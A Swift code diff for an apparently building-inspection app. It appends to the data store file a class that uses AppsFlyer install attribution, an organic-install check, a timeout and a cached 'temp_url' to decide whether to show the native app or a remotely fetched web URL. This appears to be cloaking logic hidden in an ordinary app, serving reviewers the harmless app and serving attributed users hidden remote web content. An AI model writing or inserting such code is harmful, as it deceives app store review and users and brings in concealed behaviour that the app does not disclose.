@@ -1,5 +1,6 @@
 import Foundation
 import Combine
+import AppsFlyerLib
 
 class DataStore: ObservableObject {
     static let shared = DataStore()
@@ -290,5 +291,209 @@ class DataStore: ObservableObject {
     private func saveAll() {
         saveBuildings(); saveRooms(); saveCracks(); saveMeasurements()
         savePhotos(); saveInspections(); saveRepairs(); saveTasks(); saveActivities()
+    }
+}
+
+@MainActor
+final class BuildInspectApplication: ObservableObject {
+    
+    @Published var showPermissionPrompt = false
+    @Published var showOfflineView = false
+    @Published var navigateToMain = false
+    @Published var navigateToWeb = false
+    
+    private let chain: MiddlewareChain
+    private let context: RequestContext
+    private var timeoutTask: Task<Void, Never>?
+    
+    init(
+        storage: StorageService,
+        validation: ValidationService,
+        network: NetworkService,
+        notification: NotificationService
+    ) {
+        self.context = RequestContext()
+        
+        self.chain = MiddlewareChain { request, context in
+            return .error(MiddlewareError.invalidData)
+        }
+        
+        chain.use(LoggingMiddleware())
+        chain.use(LockMiddleware())
+        chain.use(StorageMiddleware(storage: storage))
+        chain.use(ValidationMiddleware(validator: validation))
+        chain.use(NetworkMiddleware(network: network))
+        chain.use(PermissionMiddleware(notificationService: notification))
+        chain.use(BusinessLogicMiddleware())
+    }
+    
+    // MARK: - Public API
+    
+    func initialize() {
+        Task {
+            let response = await chain.execute(request: .initialize, context: context)
+            await handleResponse(response)
+            
+            // ❌ НЕ проверяем endpoint! Всегда идём по полному flow!
+            
+            scheduleTimeout()
+        }
+    }
+    
+    func handleTracking(_ data: [String: Any]) {
+        Task {
+            let response = await chain.execute(request: .handleTracking(data), context: context)
+            await handleResponse(response)
+            
+            await performValidation()
+        }
+    }
+    
+    func handleNavigation(_ data: [String: Any]) {
+        Task {
+            let response = await chain.execute(request: .handleNavigation(data), context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    func requestPermission() {
+        Task {
+            let response = await chain.execute(request: .requestPermission, context: context)
+            await handleResponse(response)
+            
+            showPermissionPrompt = false
+            navigateToWeb = true
+        }
+    }
+    
+    func deferPermission() {
+        Task {
+            let response = await chain.execute(request: .deferPermission, context: context)
+            await handleResponse(response)
+            
+            showPermissionPrompt = false
+            navigateToWeb = true
+        }
+    }
+    
+    func networkStatusChanged(_ isConnected: Bool) {
+        Task {
+            let response = await chain.execute(request: .networkStatusChanged(isConnected), context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    func timeout() {
+        Task {
+            timeoutTask?.cancel()
+            let response = await chain.execute(request: .timeout, context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    // MARK: - Private Logic
+    
+    private func scheduleTimeout() {
+        timeoutTask = Task {
+            try? await Task.sleep(nanoseconds: 30_000_000_000)
+            guard !context.isLocked else { return }
+            await timeout()
+        }
+    }
+    
+    private func performValidation() async {
+        guard !context.isLocked, context.hasTracking() else { return }
+        
+        let response = await chain.execute(request: .processValidation, context: context)
+        await handleResponse(response)
+        
+        if case .validationCompleted(let isValid) = response {
+            if isValid {
+                // ✅ Validation passed - продолжаем flow
+                await executeBusinessLogic()
+            } else {
+                // ❌ Validation failed - сразу на Main!
+                timeoutTask?.cancel()
+                navigateToMain = true
+            }
+        }
+    }
+    
+    private func executeBusinessLogic() async {
+        guard !context.isLocked, context.hasTracking() else {
+            navigateToMain = true
+            return
+        }
+        
+        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+            await finalizeWithEndpoint(temp)
+            return
+        }
+        
+        if context.isOrganic() && context.isFirstLaunch {
+            await executeOrganicFlow()
+            return
+        }
+        
+        await fetchEndpoint()
+    }
+    
+    private func executeOrganicFlow() async {
+        try? await Task.sleep(nanoseconds: 5_000_000_000)
+        
+        guard !context.isLocked else { return }
+        
+        let deviceID = AppsFlyerLib.shared().getAppsFlyerUID()
+        let response = await chain.execute(request: .fetchAttribution(deviceID: deviceID), context: context)
+        
+        if case .attributionFetched(let data) = response {
+            await handleTracking(data)
+            await fetchEndpoint()
+        } else {
+            navigateToMain = true
+        }
+    }
+    
+    private func fetchEndpoint() async {
+        guard !context.isLocked else { return }
+        
+        let trackingDict = context.tracking.mapValues { $0 as Any }
+        let response = await chain.execute(request: .fetchEndpoint(tracking: trackingDict), context: context)
+        
+        if case .endpointFetched(let url) = response {
+            await finalizeWithEndpoint(url)
+        } else {
+            navigateToMain = true
+        }
+    }
+    
+    private func finalizeWithEndpoint(_ url: String) async {
+        let response = await chain.execute(request: .finalizeWithEndpoint(url), context: context)
+        await handleResponse(response)
+    }
+    
+    private func handleResponse(_ response: AppResponse) async {
+        switch response {
+        case .navigateToMain:
+            navigateToMain = true
+            
+        case .navigateToWeb:
+            navigateToWeb = true
+            
+        case .showPermissionPrompt:
+            showPermissionPrompt = true
+            
+        case .hidePermissionPrompt:
+            showPermissionPrompt = false
+            
+        case .showOfflineView:
+            showOfflineView = true
+            
+        case .hideOfflineView:
+            showOfflineView = false
+            
+        default:
+            break
+        }
     }
 }
